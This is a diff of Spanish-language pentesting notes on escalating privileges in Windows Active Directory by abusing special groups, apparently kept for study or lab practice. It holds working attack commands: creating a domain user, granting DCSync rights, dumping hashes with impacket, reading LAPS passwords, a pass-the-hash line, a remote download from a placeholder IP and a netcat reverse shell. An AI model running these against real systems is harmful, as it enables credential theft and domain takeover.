@@ -9,8 +9,10 @@ Tags: #Windows #PrivEsc #GruposExpeciales
 	# <user> = Nombre del usuario actual 
 ```
 
+
+## Azure Admins
 ```powershell
-1. 'Azure Admins' = Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.
+Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.
 
 
 Pasos: 
@@ -22,8 +24,9 @@ Notas:
 	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
 ```
 
+## Server Operators
 ```powershell 
-2. 'Server Operators' = Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.
+Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.
 
 
 Pasos:
@@ -45,62 +48,53 @@ Notas:
 	1. Antes de iniciar el servicio, en Kali se debe de estar en 'listening' con 'Netcat' para establecer la Revershell 
 ```
 
+## LAPS_Readers
 ```powershell 
-3. 'LAPS_Readers' =  Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.
+Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.
 
-# Descargar laa tool 
+# Descargar la tool 
 https://github.com/kfosaaen/Get-LAPSPasswords
 
-Pasos:
-❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/Get-LAPSPasswords.ps1','Get-LAPSPasswords.ps1')" # Descargar la tool 
-
+Paso 1:
 ❯ Import-Module .\Get-LAPSPasswords.ps1   # Importar el módulo 
 
-❯ Get-LAPSPasswords      # Ejecutar la función para obtener la password de Administrator
+Paso 2:
+❯ Get-LAPSPasswords    # Ejecutar la función para obtener la password de Administrator
 ```
 
+## Account Operators
 ```powershell
-4. 'Account Operators' = Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
 
 
-Pasos:
-❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators' en Windows 
-❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
-❯ net group        # Mirar los grupos existentes 
-❯ net user omar    # Mirar la info del usuario 
+Paso 1:
+❯ net user omar 'P@$$w0rd123!' /add /domain     # Crear un usuario a nivel de dominio  
+❯ net group "Exchange Windows Permissions" omar /add    # Agregar al usuario al grupo 'Exchange Windows Permissions'
+❯ net user omar    # Mirar que el usar este en el grupo 
 
-
+Paso 2:
 # Agregar el privilegio de DCSync al usuario  
-❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+❯ $SecPassword = ConvertTo-SecureString 'P@$$w0rd123!' -AsPlainText -Force
 	# password = Contraseña del usuario creado 
-	
+
+Paso 3:
 ❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
-	# user = Usuario creado 
+	# user = Usuario creado (omar)
 	# domain1.local = Dominio 
 
-❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
-	# user = Usuario que se agrego en la variable $Cred
+Paso 4: Instalar 'PowerView.ps1' para poder ejecutar este comando 
+❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity <user> -Rights DCSync 
+	# user = Usuario que se agrego en la variable $Cred (omar)
 
-Notas: 
-	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
-
-
+Paso 5:
 # Hacer DCSync en Kali 
 ❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
-	# IP-DC = La dirección IP del DC  
-
-❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :HashNT   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
-
-NOTA:
-	Utilizar el hash NT
-	Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
-	Donde:
-		- 32693b11e6aa90eb43d32c72a07ceea6 = HASH NT 
-		- aad3b435b51404eeaad3b435b51404ee = HASH LM
+	# IP-DC = La dirección IP del DC
 ```
 
+## Certificate Service DCOM Access
 ```powershell 
-5. 'Certificate Service DCOM Access' = Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
+Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
 Esto significa que los usuarios de ese grupo pueden interactuar con la CA de forma remota (por ejemplo, para solicitar certificados). Además, debe de existir una plantilla vulnerable en la 'CA' como: 'Enrollee supplies subject, client authentication (OID)' y no tener restricciones de grupo
 
 
